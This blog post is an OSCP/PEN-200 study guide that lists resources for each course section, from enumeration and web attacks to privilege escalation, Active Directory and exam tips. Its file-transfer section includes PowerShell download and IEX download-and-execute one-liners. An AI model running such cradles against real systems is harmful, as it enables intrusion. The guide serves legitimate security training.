<h1 id="overview">Overview:</h1>
<p>After releasing the first version of my PWK/OSCP guide, Offsec released an update to the PWK/OSCP and included a key classification system to help students understand how course designation work. The PWK/OSCP is classified as PEN-200 and after spending some time reviewing the course I decided that I wanted to create an update version to help future students out there prepare for the new PEN-200. 
For those of you that have read my previous version you will notice there may be some sections that still have the same resources but you will also notice new resources for each section. I have taken to time to make sure that the information and my advice will help prepare for your adventure to take the PEN-200 PWK/OSCP!</p>

<p>For those of you that would like to know about my journey when I took the course and exam, you can find my earlier post here: 
<a href="https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html">https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html</a></p>

<p>If you are still going through the old labs and course material, you find the first guide here:
<a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html</a></p>

<h1 id="dedication">Dedication:</h1>
<p>As always a big shout out goes to abatchy! Without his guide I would have never started exploring for other resources. Thank you for creating your original guide:

<p>I also want to thank the following people for taking the time to read and provide feedback for the updated version of this guide:</p>

</ul>

<p>This guide has been approved by Offensive Security for PEN-200!</p>

<h1 id="a-word-of-warning">A Word of Warning!:</h1>
<p>Do not expect these resources to be the main thing you use for obtaining OSCP. When you are ready to take the course, you should expect the following:</p>

<ol>
  <li>Spending a lot of time researching.</li>
  <li>Do not expect the student admins or even other students to give you answers easily; put in the effort to research your questions.</li>
  <li>Plan to make a commitment to this and have an open mindset to learning new things.</li>
  <li>Everyone prepares differently and mentally. Learn to build your own strategy/methodology that works for you when you are improving your practical skills.</li>
  <li>Know your tools! There are certain tools that you cannot use for the exam. However, that does not mean you should skip over them. Take some time to understand them because you may have to use them on an actual engagement or in the field.</li>
  <li>Be careful when using Automated Tools: Automated tools can improve your performance and reduce the time taken in your methodology when assessing a target. However, the automated tools created by these developers have certain features or create scripts that combine common tools to automate their findings. These tools can miss services or findings that you should be looking for. It would be best if you take the time to understand how things work manually.</li>
  <li>Remember Offensive Security motto: TRY HARDER <a href="https://www.offensive-security.com/offsec/what-it-means-to-try-harder/">https://www.offensive-security.com/offsec/what-it-means-to-try-harder/</a></li>
</ol>

<p>As of now Offensive Security has restricted the following tools:</p>
<ul>
  <li>Commercial tools or services (Metasploit Pro, Burp Pro, etc.)</li>
  <li>Automatic exploitation tools. (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)</li>
  <li>Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)</li>
  <li>Features in other tools that utilize either forbidden or restricted exam limitations</li>
  <li>
    <p>Any tools that perform similar functions as those above are also prohibited. You are ultimately responsible for knowing what features or external utilities any chosen tool is using. The primary objective of the OSCP exam is to evaluate your skills in identifying and exploiting vulnerabilities, not in automating the process.</p>
  </li>
  <li>Use Case for Understanding the Tools/Scripts you use in a Pentest: <a href="https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/">https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/</a></li>
</ul>

<p>Reference: <a href="https://support.offensive-security.com/oscp-exam-guide/">https://support.offensive-security.com/oscp-exam-guide/</a></p>

<p>Most importantly: Have fun! You will learn a lot from this course, take your time to understand the material and this guide. 
Do not forget to take breaks and spend time away from the electronics. Trust me you do not want to burn yourself out.</p>

<h2 id="course-syllabus">Course Syllabus</h2>

<p>The 2nd most important resource that I used to help me prepare for the course:
<a href="https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf</a></p>

<p>From the syllabus I will breakdown each section by providing you the resources I used to prepare for the course. Once I finish going through the syllabus, I will also be providing some extra resources that came in handy. You don’t need to use this guide in order; feel free to jump around as it suits you.</p>

<h1 id="section-1-general-course-information">Section 1: General Course Information</h1>

<p>This section provides an overview of what you should expect on the course. The PDF guide you will receive with your course materials contains a list of resources and how you should approach the material and lab environment. I highly recommend to you read the restrictions carefully and the OffSec perception of how a report is created. 
Those sections are really going to help you understand how you should be taking your notes, writing your report, what to expect when your are testing the lab environment, and also what you should be careful of doing when you are going through the course.</p>

<p>When it comes to report writing and note taking you should be documenting EVERYTHING that you identify. This includes output from scans, screenshots from key findings, your assumptions, and much more. Organizing these notes will pay off in the long term when it comes to writing the report. Remember you can always choose to not include information in the report if you don’t need it. But re-tracing your steps to grab screenshots, tool output, etc. will take valuable time.</p>

<p>Keep in mind that everyone takes notes and builds their reports differently. It is up to you to build your format and layout when you are creating these notes that fits your workflow. You’ll develop and hone this as you go through the exercises and labs. This is a very important lesson.</p>

<p>Here are some resources that can give you an idea of note taking tools, what templates people use for note taking, and how corporations create their pentest reports:</p>

    <p>PowerShell and PowerCat:</p>
  </li>
</ul>

<p>PowerShell is a cross-platform scripting language built by Microsoft that can is used for task automation and configuration management. PowerShell consists of running in a shell or a command-line environment. Unlike most shells, which accept and return text, PowerShell is built on top of the .NET Common Language Runtime (CLR), and accepts and returns .NET objects. PowerShell is a very powerful tool that pentesters use as it is installed Default on Windows and it can also be installed on Linux systems as well.</p>

<p>If you think you have a good understanding of what DNS is then you will also need to understand how to perform forward and reverse lookups. In addition, you should also know how zone transfers work and how to perform them. Performing these tests will certainly help you better understand what your targets are in the lab.

<h3 id="network-scanning">Network Scanning:</h3>

<p>Nmap: 
A tool that you should 100% totally learn about. You will probably use this everyday (If not most of the time while you are in the lab). I highly recommend you take some time to learn what the tool does, how each command switch works, each scanning technique you can run, and any other capabilities. 
Nmap is a powerful tool that has the ability to determine what hosts are online, what services they are running, what operating system is running on that host, and dozens of characteristics.  In addition, one of the most powerful features that you should also learn is the Nmap Scripting Engine (NSE). With NSE scripts you have the ability automate a wide variety of networking tasks for your scans including vulnerability detection and exploitation. 
 Here are my resources that I used to learn more about Nmap:</p>

<ul>
  <li>Nmap Official Guide: I used this more than the man pages. I highly recommend purchasing the full book since the official guide is missing a few chapters, such as “Detecting and Subverting Firewalls and Intrusion Detection Systems”, “Optimizing Nmap Performance”, “Port Scanning Techniques and Algorithms”, “Host Discovery (Ping Scanning)”, and more. <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></li>

<h3 id="service-enumeration">Service Enumeration:</h3>
<p>There are a variety of services running on so many systems…take the time to understand them! Do not just scan them and move on. Take some time to look at each of them because they could be a key for you to obtain shell access on a system!</p>

<p>Abatchy provided a link from 0day security that gave me a lot of ideas and things to look for that I may have missed when I skipped some the of the services in the lab. The original link is dead but you can find copies of it on the wayback machine:

<h1 id="section-8-vulnerability-scanning">Section 8: Vulnerability Scanning</h1>
<p>I did not spend too much time in this section for preparation because vulnerability scanners are simple and easy to configure. In addition, the purpose of a vulnerability scanner is to identify security holes in services or in a operating system. These scanners rely on a database that contains the necessary information needed to conduct a scan. 
A word of caution! Be careful when you use vulnerability scanners on your targets because there is a chance that some of the plugins or features can cause an impact to your target such as taking down that service, locking out user accounts, and even crash the system.</p>

<p>The update replaces OpenVAS and students will learn how to use use Nessus. Nessus is more stable on Kali Linux and it has a simple straightforward interface. I also was able to use the Nessus Essential key for most of my testing and to help me get familiar with how these vulnerability scanners work.  Nessus is a real popular tool for vulnerability scanning in the infosec world and I certainly encourage you to play with it!</p>

<p>For instructions on how to install Nessus on Kali Linux you can find it here:

<h1 id="section-9-web-application-attacks">Section 9: Web Application Attacks</h1>

<p>I went back to this section and I really enjoyed how OffSec took the time to go more in-depth on how you should build your web assessment methodology. After all web apps are starting to become more popular to see on pentests.</p>

<p>As a pentester you need to gather information about the web application. For instance you should ask yourself these questions:</p>

<ul>
  <li>What is the purpose of the application?</li>
  <li>What language is the web application written in?</li>
  <li>What version is the web application running?</li>
  <li>How is the web application being hosted?</li>
  <li>Does the web application connect to a database? If yes; what is software the database is using and what version is it?</li>
</ul>

<p>Identifying the components of the web application will allow you to proceed to the next phase by enumerating the components/issues you identified instead of running an exploit blindly against the web application. 
As always enumeration is something that pentesters must continue to do when reviewing all possible attack avenues that could compromise the web application.</p>

<p>Things to check for when you are enumerating a web application:</p>

<p>Reviewing URLs:</p>
<ul>
  <li>File Extensions</li>
  <li>routes</li>
  <li>hidden web directories (sitemaps like robot.txt or sitemap.xml)</li>
  <li>non-standard ports</li>
</ul>

<p>Reviewing the content of the web page:</p>
<ul>
  <li>Always review the source code of the web page!</li>
  <li>Inspect every element to see how the web app works</li>
  <li>Review the request and response headers to understand how the web application behaves when you make certain actions to it.</li>
  <li>Check for admin consoles (Ex: Wordpress applications will have a directory /admin that can be used to access the Wordpress Admin Console)</li>
</ul>

<h5 id="burpsuite">BurpSuite:</h5>

<p>A popular web application vulnerability scanner that contains a variety of features and plugins to identify web vulnerabilities on certain web applications. The tool uses an interception proxy that connects to your browser to route traffic through the Burp Suite proxy client. Once the interception proxy is configured you can start capturing and analyzing each request to and from the target web application. With theses’ captured requests a penetration tester can analyze, manipulate, and fuzz individual HTTP requests in order to identify potential parameters or injection points manually.</p>

<p>When an administrative login panel is left exposed it can make it significantly easier for attackers to compromise that site, depending on the security and permissions that web developer/application have implemented. 
As pentesters we can execute techniques such as brute forcing, signing in with compromised credentials/obtaining credentials, or in the case of unpatched systems, access by exploiting the administration login page.</p>

<h1 id="section-10-buffer-overflows-for-windows-and-linux">Section 10: Buffer Overflows for Windows and Linux</h1>

<p>My favorite section to learn about! The material provided in the PWK was fantastic and really straightforward. Throughout the internet you will probably find a variety of different resources to help you understand how buffer overflows work. With that being said I will provide some of my notes and resources that helped me understand how buffer overflows.</p>

<p>Corelan Team:  A huge shout out to these guys because their articles from information security to exploit development are absolutely incredible!
They have an article they posted about Stack Based Overflows that gave me a better understanding of identifying a buffer overflow in an application:</p>
<ul>
  <li>Part 1: 
<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a></li>
  <li>Part 2: 
<a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/">https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a></li>
</ul>

<p>Once I finished reading the articles I decided to start going through write-ups and forums where people manually identified buffer overflows in certain applications. With these walkthroughs I used Exploit-DB to check if they had the vulnerable application in many cases. I won’t provide any of these walkthroughs but I will at least provide the binaries that you can use to manually identify buffer overflows.</p>

<h1 id="section-11-client-side-attacks">Section 11: Client-Side Attacks</h1>
<p>Running Client-Side Attacks usually require client interaction so it’s good to have an understanding of how this works and also how you can set one up. For instance, check out the Client Side Attack Section in Metasploit Unleashed: <a href="https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/">https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/</a></p>

<p>Social Engineering is one of the most common tactic that can be used to execute a proper client side attack. Depending on the tactic you use and the information you have gathered to plan this attack, you will have a better chance of success for the client to click on it. Here are some client side attacks that are commonly used:</p>

<h1 id="section-12-handling-public-exploits">Section 12: Handling Public Exploits</h1>

<p>There will come a time that you will need to use a public exploit on your target to see if you can obtain a shell on it. With that exploit you may need to modify shellcode or even parts of the exploit to match with your system to obtain a connection from your target.
A word of advice: Be aware of the exploits you download from the public! Although these exploits can endanger any system they could also endanger yours. Make sure you review the source code and test the exploits in an contained environment before running them on your actual system.</p>

<p>Before you download a public exploit I would consider you take some time to review the code and understand what the exploit is suppose to actually too. If you do not understand how the code works…do some research!!! I am absolutely positive you can find proof of concepts online and walkthroughs that will explain how the exploit actually works.  Not all exploits are going to work right out of the box you will need to configure them to make sure they can reach back to your attacking system. If you do not review the exploit code or make any modifications, then you are running risk that the exploit will fail, crash your target system/service, or it may allow other users to connect into the system.</p>

        Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
        Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
        exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
        named pipe.

<h1 id="section-13-transferring-files-to-your-target">Section 13: Transferring Files to your target:</h1>
<p>Depending on the target system you obtain access too you may not have the ability to transfer exploits or other tools you need to that system. With this being said you will need to figure out some techniques to transfer files to and from your target system. Here are a few guides I used to get a better understanding of how to transfer files onto Windows and Linux systems:</p>

<p>Python Modules to run services to transfer files:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">python2 -m SimpleHTTPServer 80</code> Spins up a webserver in the directory you are located on port 80.</li>
  <li><code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> Spins up a python version 3.X web server in the directory you are located on port 80.</li>
  <li><code class="language-plaintext highlighter-rouge">python2 -m pyftpdlib -p 21 -w</code> spins up a FTP server in the directory you are located on port 21 and it allows anonymous login access.</li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">python3 -m pyftpdlib -p 21 -w</code> spins up a Python 3.X FTP server in the directory you are located on port 21 and it allows anonymous login access.</p>
  </li>
  <li>Simple HTTP Server with Upload capabilities: <a href="https://github.com/tjnull/OSCP-Stuff/blob/master/Transferring-Files/HTTPServerWithUpload.py">https://github.com/tjnull/OSCP-Stuff/blob/master/Transferring-Files/HTTPServerWithUpload.py</a></li>
</ul>

<p>Tools to transfer files on Windows:</p>

<ul>
  <li>
    <p>Powershell: 
Downloading a file from your host: <code class="language-plaintext highlighter-rouge">powershell (New-Object System.Net.WebClient).DownloadFile('https://IP Address/update.exe', 'msi-installer.exe')</code>
Downloading a file and executing with Invoke-Expression: <code class="language-plaintext highlighter-rouge">powershell IEX (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/msi-installer.exe')</code></p>
  </li>
  <li>
    <p>bitsadmin. The tool is a command-line tool that you can use to create download or upload jobs and monitor their progress. You can find examples on how to use the tool here:

<h1 id="section-15-privilege-escalation">Section 15: Privilege Escalation</h1>
<p>In this section you will a range of techniques from getting administrative access from a kernel exploit or through a misconfigured service. The possibilities are endless, and make sure you find the ones that will work for you. In order to get an understanding of this section I recommend applying your knowledge through Vulnhub or Hackthebox to improve your skills in this area. I know there are scripts for automating this process but at some points those scripts can miss something very important on your target that you need to escalate your privileges. Something you should keep in mind :D.<br>
For this section I am going to break into two parts: Windows and Linux Privilege Escalation Techniques.</p>

<p>Linux Privilege Escalation Guides: 
The only guide I probably ever used to help me understand privilege escalation techniques in Linux systems was from g0tmi1k post. This blog is a must that everyone should have for preparing for the OSCP in my opinion. You can find his guide here:

<h1 id="section-16-password-cracking">Section 16: Password Cracking</h1>
<p>In this section you need to understand the basics of password attacks. Identify the differences between Windows (NTLM) hashes and Linux hashes. In addition, you will also need to understand the different tools that you can use to conduct online and offline password attacks. Typically online password cracking involves sending attempts to the authentication service; like a web form or terminal service. In offline attacks you will carry out the cracking locally, like using John The Ripper to crack a zip file on your local machine.
Here is a list of resources that I have used that helped me better understand how password cracking works:</p>

<h5 id="online-password-crackers">Online Password Crackers:</h5>
<p>Confusingly these are also online crackers but these are collections of pre-broken hashes (e.g. wordlists that have been hashed) or computing services that you can use to break hashes. I usually went for these first to see if they had the hash cracked in their database. However, don’t use these online crackers as your main tools for everything. Uploading a hash from an engagement can be a huge risk so make sure you use your offline tools to crack those types of hashes. Here is a list of online hash crackers that I found online that you can use to crack hashes:</p>

<h1 id="section-18-active-directory-attacks">Section 18: Active Directory Attacks:</h1>

<p>This was a new section that I was really looking forward to learning about when the new update was released! Active Directory is a popular service that we see running in the real world because it helps system administrators manage their systems, users, services, and much more depending on the size of their organisation.</p>

<p>Active Directory Domain Services can be installed on Windows Server (2000-2019). I highly encourage you to make some time to learn how to install Active Directory on a Windows Server (version of your liking). This will help you get an understanding how to setup your own Active Directory Environment as well.</p>

<ul>
  <li>Fundamentals of Active Directory: <a href="https://www.youtube.com/watch?v=GfqsFtmJQg0&amp;feature=emb_logo">https://www.youtube.com/watch?v=GfqsFtmJQg0&amp;feature=emb_logo</a></li>
</ul>

<p>I have provided some resources to help you get started:</p>

<p>Setting up Active Directory:</p>

<p>Note: Make sure when you are setting up the Active Directory Server that you assign a static IP address to it and also a workstation that you will be joining the server to for further testing. I recommend that you set up a Windows 10 Workstation if you plan to use Windows Server 2016/2019.</p>

<h1 id="section-20-powershell-empire">Section 20: Powershell Empire:</h1>

<p>PowerShell Empire is a post-exploitation framework that includes a pure-PowerShell Windows agent that is compatible with Python 3.x Linux/OS X agents. It is the merger of the previous PowerShell Empire and Python EmPyre projects. Recently the Kali Linux team is partnering with BC Security to sponsor PowerShell Empire. This sponsorship provides Kali users with 30-day exclusive early access to Empire and Starkiller before the updates are publicly released to the official repository.</p>

<p>Originally created by harmj0y, sixdub, and enigma0x3. On July 31, 2019 the project was no longer supported and the team at BC Security is now maintaining the most active fork of Empire <a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a>.</p>

<p>The course does a great job explaining how to use the tool and how can you use it. Here are some resources that you can look into to get an understanding of how PowerShell Empire works:</p>

<h1 id="extra-resources">Extra Resources</h1>

<p>This concludes the resources I have used that helped me understand the course syllabus. Now I will share with you some tips and extra resources that I used to prepare for the PEN200 PWK/OSCP.</p>

<h1 id="setting-up-your-pentesting-environment">Setting up your Pentesting Environment:</h1>
<p>The course recommends that you are using <a href="https://www.vmware.com/">VMware products</a> to run the custom Kali Linux image that they have created. Windows users can purchase <a href="https://www.vmware.com/products/workstation-pro.html">VMware Workstation</a> or use their free program <a href="https://www.vmware.com/products/workstation-player.html">VMware Player</a>. As for MAC Users you will need to use <a href="https://www.vmware.com/products/fusion.html">VMware Fusion</a>. 
If you would like to download the custom Kali Linux System for the PWK you can find it here:</p>

<ul>
  <li><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</a></li>
</ul>

<p>Keep in mind that the virtual machines hosted on Offensive Security are updated by the Kali Linux Team. The new PWK does not require you to use a custom Kali system they have made. You can use the latest version that the Kali Linux team maintains to complete the labs/course exercises.</p>

<p>Another virtual machine I created was a Windows 7 32-bit system to spin up any vulnerable applications I needed to debug or to check if I could obtain a shell from them. You could also create a Windows 7 64-bit system as well but some of 32-bit applications may not work properly as they would on an actual 32-bit system. This practice is great to implement in case you are stuck on a windows system that is running a service that for some reason you cannot obtain a shell on.</p>

<p>For Active Directory preparation I created a Windows Server 2019 and a Windows 10 Pro virtual machine to join to the AD environment I created. There are a few good guides on setting up AD environments in your own lab:</p>

<ul>
  <li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">MyExploit2600 AD Lab Creation</a></li>

</ul>

<h1 id="wargameshands-on-challenges">Wargames/Hands-on Challenges:</h1>
<p>I know I stated theses before but I am going to reiterate this:</p>

<p>OverTheWire Bandit:
A good set of fun Linux challenges to get yourself familiarizes with bash and Linux. Abatchys walkthrough really helped me here:</p>
<ul>
  <li>Bandit 1-5: <a href="https://www.abatchy.com/2016/10/overthewire-bandit-0-5">https://www.abatchy.com/2016/10/overthewire-bandit-0-5</a></li>

</ul>

<p>OverTheWire Natas: 
A good set of simple web application challenges. These challenges will help you understand the basics you need to identify issues in web applications. 
Check out this walkthrough here: <a href="https://infamoussyn.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/">https://infamoussyn.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/</a></p>

<p>UndertheWire: 
Probably my favorite place for challenges because they contain a huge set of PowerShell challenges. 
You can find their challenges here: <a href="http://www.underthewire.tech/wargames.htm">http://www.underthewire.tech/wargames.htm</a></p>

<p><a href="https://www.root-me.org/">Root-me.org</a> A huge place that has challenges for almost everything in cybersecurity. For instance, you will see challenges in the following areas:</p>
<ul>
  <li>Network Forensics (Packet Analysis, Captured Traffic, Network Services)</li>
  <li>Programming (C, PHP, Java, Shell-coding)</li>
  <li>Reverse Engineering (disassemble applications)</li>
  <li>Web Applications and Client Challenges.</li>
  <li>Forensic Challenges.</li>
</ul>

<p>Spend a few minutes going through some of these!</p>

<p>SANS Holiday Hack Challenges:

<h1 id="capture-the-flag-competitions-ctfscyber-competitions">Capture the Flag Competitions (CTFs)/Cyber Competitions:</h1>
<p>I know some of you are reading this are probably skeptical on why I added this…well to be honest the cybersecurity careers that we are in are not a normal 7am-3pm job…it is a lifestyle. I understand for many of us that it is hard to set some time to do all of the things in this field and that is totally OK! If you have the time or if you already can, set some time out of your busy schedule to do a CTF. Go ahead and hack all of the things that many of these CTFs provide as challenges. Trust me you will learn some cool things in a CTF that not even a class may be able to teach you. Personally, competing in CTFs did help me in this course and also it gave me a better understanding of what things I should be looking for instead of jumping into rabbit holes!</p>

<p>Also do not be scared to compete in a CTF if it is your first time! Everyone has to start somewhere in their journey you just have to keep pushing forward. So, go out there and find some CTFs whether they are local to you or online make some time and have confidence in doing them.</p>

<p>If you cannot find any local CTFs check out <a href="https://www.CTFTime.org">CTFTime</a> for online competitions that you can participate in. 
A lot of the cyber competitions in the past few years really helped me build my skills and I still go out once in awhile to find a CTF to compete in for fun 😊.  You may also find CTF’s that Offsec sponsors where you can be able to win a PWK voucher!</p>

<h1 id="vulnerable-machines">Vulnerable Machines:</h1>
<p>Boot-to-Root Vulnerable Machines! These machines are excellent to help you build your skills for pentesting. There are places where you can download them and run them on your system to begin practice or places where you can connect to their range and start hacking into the targets they have. Most of them result in obtaining root or Administrative/System level access in the end. Personally, my three favorite places are Proving Grounds, Hackthebox and Vulnhub.</p>

<p>Keep in mind that the boxes that you assess on these platforms should be used as a way to get started, to build your practical skills, or brush up on any weak points that you may have in your pentesting methodology.</p>

<p>When you are comfortable to take the course, It is encouraged that you try to go through every system that is in the PWK/OSCP lab environment, as they will provide better insight for when you attempt to the exam itself.</p>

<h3 id="proving-grounds"><a href="https://www.offensive-security.com/labs/individual/">Proving Grounds</a>:</h3>

<p>Offensive Security has released their own private lab environment where you can practice your pentest skills with the boxes they provide online. The platform offers two tiers PG Play and PG Practice. PG Play brings the boxes from Vulnhub to life and provides dedicated access by connecting to their environment through a VPN or you can use the in base Kali Linux browser system. Keep in mind that PG Play only allows you three hours per day to assess a system in the Play environment. They only provide Linux boxes as well but this could change in the future.</p>

<p>PG Practice includes all of the features and removes the three hour time limit but Practice also offers Linux and Windows boxes that you can use to improve your pentesting skills as these boxes are created by Offsec Experts. Some of the systems you may notice were old Offsec Exam machines that you can assess to sharpen your hacking skills.</p>

<p>With the approval from Offsec I have created a list of boxes that I have gone through that I believe were OSCP Like. You can find the list here and check for updates that I will add to the list in the future:</p>

<p><img src="/assets/img/posts/TJNulls_Preparation_Guide_for_PEN_200/proving-grounds.PNG" alt="alt-text"></p>

<h3 id="hackthebox"><a href="https://www.hackthebox.eu/">HackTheBox</a>:</h3>
<p>An online penetration testing platform that contains a variety of machines to help you improve your penetration testing skills. For those who have not gone through the registration you will need to pass a challenge to generate yourself an activation code. Once you have generated your activation code, then you will have the ability to access their range. In the free tier you are allowed to play with the 20 active machines they have and they cycle a new system in the range every week and retire an old one there as well. 
If you want to access to their retired machines you will have to get VIP access. It is a very affordable in my opinion, and worth it to invest in. If you do not have the funds to invest into Hackthebox, do not worry because you can certainly find these walkthroughs online (once the boxes are retired). One place I would definitely recommend to look at is IppSec Hackthebox Walkthroughs on YouTube! I love watching his videos because he goes through step by step on how to obtain access onto the target and how to escalate your privileges to obtain root access. Each box has a different scenario and IppSec always has something extra to throw in when he is doing his walkthroughs.</p>

<p>With that being said I created a list of all of boxes that I did in Hackthebox that I thought were OSCP Like. You can find them here and also check out IppSec playlist he created from the list I recommended to start watching!</p>

<p><img src="/assets/img/posts/TJNulls_Preparation_Guide_for_PEN_200/hackthebox.JPG" alt="alt-text"></p>

<p>I will continue to be updating this list in the future, and if you would like to keep it around you can find it here and on NetSecFocus: <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159</a></p>

<h3 id="vulnhub"><a href="https://www.vulnhub.com/">Vulnhub</a>:</h3>
<p>Just like Hackthebox, except you have to download the vulnerable machines and run them on your local system. You will need VMware or VirtualBox (I recommend VMware workstation) to run these vulnerable systems. Please make sure that you are running these vulnerable systems on an isolated network and not on a public network.<br>
Thanks to g0tmi1k and his team for hosting this site and to the creators who submit these vulnerable machines. I have also created a list of vulnhub machines that I have found to be OSCP-Like as well. You can find them here and on NetSecFocus:</p>

<p><img src="/assets/img/posts/TJNulls_Preparation_Guide_for_PEN_200/vulnhub.JPG" alt="alt-text"></p>

<p>I will continue to update this list and if you would like a copy for review you can certainly find it here: 
<a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0</a></p>

<p>Rooting Vulnerable Machines is extremely important when you are preparing for PWK/OSCP because you can’t depend on theoretical knowledge to pass. Improving your hands-on skills will play a huge key role when you are tackling these machines.</p>

<h1 id="tips-to-participate-in-the-proctored-oscp-exam">Tips to participate in the Proctored OSCP exam:</h1>

<p>As of August 15th, 2018, all OSCP exams have a proctored exam. This means that a student will be monitored by an Offensive Security staff member through a screen sharing and webcam service. If you would like to learn more about this new proctoring process you can find it here: <a href="https://www.offensive-security.com/offsec/proctoring/">https://www.offensive-security.com/offsec/proctoring/</a>
Before I took my exam, I had to go through a variety of things to make sure I was prepared to take my 1st attempt. Even with my preparation, I lost 30 mins of my actual exam time due to troubleshooting the applications for the proctor on my end. With that being said, here are my tips to help you guys prepare for the proctoring section when you are ready to take the exam:</p>

<ol>
  <li>Make sure your system is able to meet the software/hardware requirements that offensive security provides in order to run these services. You can find that information here: <a href="https://support.offensive-security.com/proctoring-faq/">https://support.offensive-security.com/proctoring-faq/</a></li>
  <li>Test your webcam to make sure it works. you cannot use a spare laptop that has a webcam and connect the webcam session onto that system.</li>
  <li>The Screen Sharing application needs to be running on your main system that you will be using to connect to your exam.</li>
  <li>You can use multiple monitors for the exam. Keep in mind that the proctor must be able to see them and that they are connected to your system. The proctor will notify you about how many screens they see and you will need to confirm them with the number monitors you are using. If you use a system that has a monitor and it is not connected to the ScreenConnect application, then you will not be able to use that monitor for the exam.</li>
  <li>Be prepared and log into your webcam and ScreenConnect sessions 30 mins before your exam.</li>
  <li>Proctors cannot provide any assistance during the exam.</li>
  <li>You can take breaks, a nap, or grab a cup of coffee during your exam. Just make sure you notify the proctor when you leave and when you return for your exam.</li>
  <li>Students are not allowed to record their screens while interacting with any of the exam machines.</li>
  <li>Also be dressed for your exam. I think that is pretty simple to understand why.</li>
</ol>

<h1 id="conclusion">Conclusion:</h1>
<p>Well then! It seems you have made it to the end of this journey (well not your OSCP journey if you decide to pursue it!). If you read this entire guide, I certainly give you props for doing so. If you read only parts of it, then I still give you props because the main thing that is important to me is that you learned something from it!</p>

<p>I hope you are able to use my guide in your OSCP journey and are able to learn some new things, just like I did when I started mine. If this guide was able to help you let me know I want your feedback for sure. I thanked a lot of people for helping me with my journey in this guide and I want to thank them again for their time and contributions for helping me learn and grow in the cyber-security field.</p>

<p>If anyone has any questions about this guide or feedback please let me know as you can reach out to me on twitter, discord, or on NetSecFocus!</p>
